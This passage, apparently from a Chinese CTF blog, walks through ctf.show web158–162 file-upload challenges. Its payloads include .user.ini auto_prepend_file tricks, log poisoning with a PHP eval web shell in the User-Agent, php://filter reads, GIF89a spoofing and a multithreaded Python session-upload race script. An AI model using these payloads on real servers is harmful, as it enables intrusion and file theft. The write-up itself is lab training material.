&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;muma.png&lt;/code&gt;，这一题过滤 &lt;code&gt;php&lt;/code&gt;、 &lt;code&gt;[]&lt;/code&gt;、&lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt; 、&lt;code&gt;;&lt;/code&gt; 、&lt;code&gt;log&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;array_pop()&lt;/code&gt; 将数组中最后一个元素取出并删除&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;使用 &lt;code&gt;$_POST&lt;/code&gt; 接受任意变量&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819000027970.png&#34; alt=&#34;image-20250819000027970&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/

#POST
a=system(&amp;quot;tac ../flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819000007796.png&#34; alt=&#34;image-20250819000007796&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web159&#34;&gt;&lt;a href=&#34;#web159&#34; class=&#34;headerlink&#34; title=&#34;web159&#34;&gt;&lt;/a&gt;web159&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819134826160.png&#34; alt=&#34;image-20250819134826160&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;muma.png&lt;/code&gt;，这一题过滤 &lt;code&gt;php&lt;/code&gt;、 &lt;code&gt;[]&lt;/code&gt;、&lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt; 、&lt;code&gt;;&lt;/code&gt; 、&lt;code&gt;log&lt;/code&gt;、&lt;code&gt;(&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?= `tac ../flag.???`?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819135336499.png&#34; alt=&#34;image-20250819135336499&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819135308470.png&#34; alt=&#34;image-20250819135308470&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;日志包含&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819164024580.png&#34; alt=&#34;image-20250819164024580&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行日志文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?include &amp;#39;/var/lo&amp;#39;.&amp;#39;g/nginx/access.l&amp;#39;.&amp;#39;og&amp;#39;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819164002362.png&#34; alt=&#34;image-20250819164002362&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/upload&lt;/code&gt; 可以查看日志内容，同时在 &lt;code&gt;User-Agent&lt;/code&gt; 写入一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注入后在日志内容可以看见 &lt;code&gt;aaa&lt;/code&gt; 标记 ，表明写入成功&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/

#User-Agent
aaa&amp;lt;?php @eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819163829147.png&#34; alt=&#34;image-20250819163829147&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;连接蚁剑（&lt;code&gt;靶机/upload/&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819163924591.png&#34; alt=&#34;image-20250819163924591&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web160&#34;&gt;&lt;a href=&#34;#web160&#34; class=&#34;headerlink&#34; title=&#34;web160&#34;&gt;&lt;/a&gt;web160&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819165424855.png&#34; alt=&#34;image-20250819165424855&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行日志文件，这一题过滤 &lt;code&gt;php&lt;/code&gt;、 &lt;code&gt;[]&lt;/code&gt;、&lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt; 、&lt;code&gt;;&lt;/code&gt; 、&lt;code&gt;log&lt;/code&gt;、&lt;code&gt;(&lt;/code&gt; 、&lt;code&gt;空格&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?=include&amp;quot;/var/lo&amp;quot;.&amp;quot;g/nginx/access.lo&amp;quot;.&amp;quot;g&amp;quot;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819165409321.png&#34; alt=&#34;image-20250819165409321&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/upload&lt;/code&gt; 可以查看日志内容，同时在 &lt;code&gt;User-Agent&lt;/code&gt; 写入一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注入后在日志内容可以看见 &lt;code&gt;aaa&lt;/code&gt; 标记 ，表明写入成功&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/

#User-Agent
aaaaa&amp;lt;?php @eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819165353188.png&#34; alt=&#34;image-20250819165353188&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;连接蚁剑（&lt;code&gt;靶机/upload/&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819165250645.png&#34; alt=&#34;image-20250819165250645&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819170103240.png&#34; alt=&#34;image-20250819170103240&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php伪协议&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?=include&amp;quot;ph&amp;quot;.&amp;quot;p://filter/convert.base64-encode/resource=../flag.p&amp;quot;.&amp;quot;hp&amp;quot;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819170048632.png&#34; alt=&#34;image-20250819170048632&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;upload&lt;/code&gt; ，&lt;code&gt;base64&lt;/code&gt; 解码得到flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819170003662.png&#34; alt=&#34;image-20250819170003662&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web161&#34;&gt;&lt;a href=&#34;#web161&#34; class=&#34;headerlink&#34; title=&#34;web161&#34;&gt;&lt;/a&gt;web161&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;scss&#34;&gt;getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;后端会检测png文件是否真的为png，所以要在图片头加上 &lt;code&gt;GIF89a&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;，加上 &lt;code&gt;GIF86a&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;GIF89a
auto_prepend_file=&amp;quot;muma.png&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819171303205.png&#34; alt=&#34;image-20250819171303205&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php伪协议，加上 &lt;code&gt;GIF86a&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;GIF89a
&amp;lt;?=include&amp;quot;ph&amp;quot;.&amp;quot;p://filter/convert.base64-encode/resource=../flag.p&amp;quot;.&amp;quot;hp&amp;quot;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819171534908.png&#34; alt=&#34;image-20250819171534908&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;upload&lt;/code&gt; ，&lt;code&gt;base64&lt;/code&gt; 解码得到flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819171519897.png&#34; alt=&#34;image-20250819171519897&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web162&#34;&gt;&lt;a href=&#34;#web162&#34; class=&#34;headerlink&#34; title=&#34;web162&#34;&gt;&lt;/a&gt;web162&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;session文件上传竞争&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;，加上 &lt;code&gt;GIF86a&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;GIF89a
auto_prepend_file=/tmp/sess_love
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819181816577.png&#34; alt=&#34;image-20250819181816577&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用 &lt;code&gt;POST.html&lt;/code&gt; 上传任意一个文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意在相应位置修改靶机地址和命令&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;!-- 修改靶机地址 --&amp;gt;
&amp;lt;form action=&amp;quot;http://4cd3d241-1c9b-41b4-8616-b78eca5347a6.challenge.ctf.show/&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
&amp;lt;!-- 修改命令 --&amp;gt;
    &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;&amp;lt;?php system(&amp;quot;tac ../flag.php&amp;quot;);?&amp;gt;&amp;quot; /&amp;gt;
    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;
    &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;submit&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将抓到的包发送到 &lt;code&gt;Intruder&lt;/code&gt; 爆破模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;cookie&lt;/code&gt; 后添加 &lt;code&gt;PHPSESSID=love&lt;/code&gt;（ &lt;code&gt;PHPSESSID&lt;/code&gt; 的值任意）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如下示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;Cookie: PHPSESSID=love
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意没有 &lt;code&gt;payload&lt;/code&gt; 插入点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置 &lt;code&gt;Payload type&lt;/code&gt; 为 &lt;code&gt;Null payloads&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;勾选 &lt;code&gt;Continue indefinitely&lt;/code&gt; 无限重复&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819182340513.png&#34; alt=&#34;image-20250819182340513&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;新建 &lt;code&gt;Resource pool&lt;/code&gt; 资源池，设置线程 &lt;code&gt;30&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Start attack&lt;/code&gt; 开始爆破，不断上传文件&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819181747316.png&#34; alt=&#34;image-20250819181747316&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/upload/index.php&lt;/code&gt; 并抓包&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/upload/index.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;相当于在 &lt;code&gt;index.php&lt;/code&gt; 文件中执行 &lt;code&gt;include /tmp/sess_love&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;同上（这里不需要对 &lt;code&gt;cookie&lt;/code&gt; 进行修改处理）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将抓到的包发送到 &lt;code&gt;Intruder&lt;/code&gt; 爆破模块，注意没有 &lt;code&gt;payload&lt;/code&gt; 插入点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置 &lt;code&gt;Payload type&lt;/code&gt; 为 &lt;code&gt;Null payloads&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;勾选 &lt;code&gt;Continue indefinitely&lt;/code&gt; 无限重复&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;新建 &lt;code&gt;Resource pool&lt;/code&gt; 资源池，设置线程 &lt;code&gt;80&lt;/code&gt; (访问包的线程数需要大于上传包的线程数)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Start attack&lt;/code&gt; 开始爆破，不断访问文件&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819181656530.png&#34; alt=&#34;image-20250819181656530&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看访问 &lt;code&gt;靶机/upload/index.php&lt;/code&gt; 的包的爆破结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;根据 &lt;code&gt;Length&lt;/code&gt; 长度的不同找到命令的回显&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819181614865.png&#34; alt=&#34;image-20250819181614865&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;，加上 &lt;code&gt;GIF86a&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;GIF89a
auto_prepend_file=/tmp/sess_love
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819181816577.png&#34; alt=&#34;image-20250819181816577&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;脚本实现条件竞争&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819194618891.png&#34; alt=&#34;image-20250819194618891&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多线程并发注入脚本&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading
import time

# === [1] 靶机地址 ===
url = &amp;#39;http://b20a06b7-799e-48aa-a105-0e1827adbf09.challenge.ctf.show/&amp;#39;

# === [2] 自定义参数 ===
PHPSESSID = &amp;#39;love&amp;#39;
PAYLOAD = &amp;#39;&amp;lt;?php system(&amp;quot;cat ../flag.php&amp;quot;);?&amp;gt;aaaaa&amp;#39;   # 修改命令，自定义标识符
IDENTIFIER = &amp;#39;aaaaa&amp;#39;  # 用于判断是否成功执行
TARGET_SESS_PATH = &amp;#39;upload/index.php&amp;#39;    # 修改读取地址

# === [3] 线程控制器 ===
found_flag = threading.Event()

# === [4] 上传线程：持续伪造上传进度 ===
def upload_payload(session, thread_id):
    data = &amp;#123;
        &amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;: PAYLOAD
    &amp;#125;

    while not found_flag.is_set():
        try:
            fake_file = io.BytesIO(b&amp;#39;A&amp;#39; * 1024 * 10)  # 10KB 文件
            session.post(
                url,
                cookies=&amp;#123;&amp;#39;PHPSESSID&amp;#39;: PHPSESSID&amp;#125;,
                data=data,
                files=&amp;#123;&amp;#39;file&amp;#39;: (f&amp;#39;upload_&amp;#123;thread_id&amp;#125;.txt&amp;#39;, fake_file)&amp;#125;,
                timeout=3
            )
            print(f&amp;#39;[Upload-&amp;#123;thread_id&amp;#125;] Upload OK&amp;#39;)
        except Exception as e:
            print(f&amp;#39;[Upload-&amp;#123;thread_id&amp;#125;] Error: &amp;#123;e&amp;#125;&amp;#39;)

# === [5] 读取线程：不断读取 sess 文件，等待触发执行 ===
def read_session(session, thread_id):
    while not found_flag.is_set():
        try:
            response = session.get(f&amp;#39;&amp;#123;url&amp;#125;&amp;#123;TARGET_SESS_PATH&amp;#125;&amp;#39;, timeout=2)     # 修改靶机读取地址
            if IDENTIFIER in response.text:
                print(f&amp;#39;\n[+] [Read-&amp;#123;thread_id&amp;#125;] Payload executed successfully!\n&amp;#39;)
                print(response.text)
                found_flag.set()
                break
            else:
                print(f&amp;#39;[-] [Read-&amp;#123;thread_id&amp;#125;] Not ready&amp;#39;)
        except Exception as e:
            print(f&amp;#39;[Read-&amp;#123;thread_id&amp;#125;] Error: &amp;#123;e&amp;#125;&amp;#39;)
        time.sleep(0.2)

# === [6] 主控函数：并发调度线程 ===
def main():
    session = requests.Session()
    threads = []

    # 启动多个上传线程
    for i in range(3):
        t = threading.Thread(target=upload_payload, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 启动多个读取线程
    for i in range(5):
        t = threading.Thread(target=read_session, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 等待直到有线程设置 found_flag
    while not found_flag.is_set():
        time.sleep(0.2)

    print(&amp;quot;\n[+] Done. Exiting all threads.&amp;quot;)

# === [7] 执行入口 ===
if __name__ == &amp;#39;__main__&amp;#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
